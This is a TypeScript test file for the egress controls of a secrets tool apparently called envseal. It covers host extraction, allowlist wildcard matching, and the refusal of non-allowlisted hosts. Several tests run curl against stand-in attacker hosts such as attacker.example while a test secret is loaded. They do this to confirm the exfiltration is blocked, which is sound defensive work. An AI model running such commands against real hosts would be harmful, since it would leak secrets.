import { describe, it, expect } from 'vitest';
import { extractEgressHosts, hostIsAllowed, UNKNOWN_HOST } from '../src/egress.js';
import { asSecret } from '@envseal/protocol';
import { runWithSecrets } from '../src/exec.js';
import type { ExecOptions } from '../src/exec.js';

describe('extractEgressHosts', () => {
  it('finds URL-literal hosts in any position', () => {
    expect(extractEgressHosts(['curl', '-s', 'https://api.openai.com/v1'])).toContain('api.openai.com');
    expect(extractEgressHosts(['node', 'fetch.js', 'http://evil.test/x'])).toContain('evil.test');
  });

  it('extracts the positional target of a network tool', () => {
    expect(extractEgressHosts(['curl', 'api.openai.com'])).toEqual(['api.openai.com']);
    expect(extractEgressHosts(['wget', '-q', 'example.test/file'])).toContain('example.test');
  });

  it('skips value-taking flags before finding the positional target', () => {
    const hosts = extractEgressHosts(['curl', '-H', 'Authorization: Bearer x', '-o', 'out.json', 'api.openai.com']);
    expect(hosts).toContain('api.openai.com');
  });

  it('marks bare-IP targets as unknown by design', () => {
    const hosts = extractEgressHosts(['curl', 'https://93.184.216.34/x']);
    expect(hosts).toContain(UNKNOWN_HOST);
    expect(extractEgressHosts(['curl', '93.184.216.34'])).toEqual([UNKNOWN_HOST]);
  });

  it('marks a network tool with no parseable target as unknown', () => {
    expect(extractEgressHosts(['curl', '--silent'])).toEqual([UNKNOWN_HOST]);
  });

  it('returns empty for commands that cannot reach the network', () => {
    expect(extractEgressHosts(['node', '-e', 'process.exit(0)'])).toEqual([]);
    expect(extractEgressHosts(['npm', 'test'])).toEqual([]);
  });
});

describe('hostIsAllowed (anchored wildcard matching)', () => {
  const allow = ['api.openai.com', '*.openai.com'];

  it('matches exact entries case-insensitively', () => {
    expect(hostIsAllowed('API.OPENAI.COM', allow)).toBe(true);
  });

  it('wildcard matches exactly one leading label', () => {
    expect(hostIsAllowed('foo.openai.com', allow)).toBe(true);
  });

  it('wildcard does not match the bare suffix domain', () => {
    expect(hostIsAllowed('openai.com', allow)).toBe(false);
  });

  it('wildcard does not match multiple extra labels', () => {
    expect(hostIsAllowed('a.b.openai.com', allow)).toBe(false);
  });

  it('never matches a suffix-lookalike', () => {
    expect(hostIsAllowed('evil.openai.com.attacker.io', allow)).toBe(false);
  });

  it('unknown host is never allowed — that refusal is the feature', () => {
    expect(hostIsAllowed(UNKNOWN_HOST, allow)).toBe(false);
    // Even a list that literally spells the sentinel must not match it.
    expect(hostIsAllowed(UNKNOWN_HOST, ['(unknown)'])).toBe(false);
  });
});

describe('env_use egress policy enforcement', () => {
  const secrets = new Map([['TEST_KEY', asSecret(Buffer.from('envseal-egress-sentinel-3f9d', 'utf8'))]]);

  function optsWith(policy: { mode: 'warn' | 'allowlist'; allow: string[] }): ExecOptions {
    return {
      cwd: process.cwd(),
      onConfirm: async () => true,
      egressPolicy: policy,
    };
  }

  it('refuses a non-allowlisted host BEFORE any dialog opens', async () => {
    let dialogOpened = false;
    await expect(
      runWithSecrets(['curl', 'https://attacker.example/echo'], secrets, {
        ...optsWith({ mode: 'allowlist', allow: ['api.openai.com'] }),
        onConfirm: async () => {
          dialogOpened = true;
          return true;
        },
      }),
    ).rejects.toMatchObject({ code: 'SEP_EGRESS_DENIED' });
    expect(dialogOpened).toBe(false);
  });

  it('refuses an undeterminable host under allowlist mode', async () => {
    await expect(
      runWithSecrets(['curl', '93.184.216.34'], secrets, optsWith({ mode: 'allowlist', allow: ['api.openai.com'] })),
    ).rejects.toMatchObject({ code: 'SEP_EGRESS_DENIED' });
  });

  it('lets an allowlisted host proceed to normal consent', async () => {
    const result = await runWithSecrets(['node', '-e', 'process.exit(0)'], secrets, {
      cwd: process.cwd(),
      onConfirm: async () => true,
      egressPolicy: { mode: 'allowlist', allow: ['api.openai.com'] },
    });
    expect(result.exitCode).toBe(0);
  });

  it('warn mode never refuses — historical behavior unchanged', async () => {
    const result = await runWithSecrets(['curl', 'https://attacker.example/echo'], secrets, {
      cwd: process.cwd(),
      // Consent denied proves the flow reached the dialog at all under warn.
      onConfirm: async () => false,
      egressPolicy: { mode: 'warn', allow: [] },
    }).catch((error: { code?: string }) => error.code);
    expect(result).toBe('SEP_CONFIRMATION_DENIED');
  });

  it('absent policy behaves exactly like warn', async () => {
    const result = await runWithSecrets(['curl', 'https://attacker.example/echo'], secrets, {
      cwd: process.cwd(),
      onConfirm: async () => false,
    }).catch((error: { code?: string }) => error.code);
    expect(result).toBe('SEP_CONFIRMATION_DENIED');
  });
});
